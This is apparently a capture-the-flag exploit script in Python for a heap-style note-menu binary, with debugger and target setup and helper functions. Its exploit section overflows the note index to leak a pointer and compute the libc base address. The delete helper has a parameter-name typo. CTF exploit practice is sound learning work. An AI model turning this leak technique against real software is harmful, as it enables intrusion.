#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    log_level='debug',
    binary=ELF('./chall_patched', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set max-visualize-chunk-size 0x500
d2d_ida
brva 0x2521
brva 0x2573
brva 0x25B4
b *main+907
b *main+1110
b *main+1319
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal = ['tmux', 'splitw', '-h', '-l', '175', '-P', "-d"]) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def choice(option: int):
    slna(b'choice: ', option)

def create(option: int):
    choice(1)
    choice(option)

def show():
    choice(2)

def setContent(idx: int, data: bytes):
    choice(3)
    slna(b': ', idx)
    sla(b': ', data)

def display(idx: int):
    choice(4)
    slna(b': ', idx)

def delete(idX: int):
    choice(5)
    slna(b': ', idx)

# ==================== EXPLOIT ====================
p = start()

for i in range(257):
    create(1)

debug()
create(2)
display(257)

ru(b'Note content: ')
libc.address = fixleak(rl()[:-1]) - 0x204010
slog('libc base @ %#x', libc.address)

interactive()
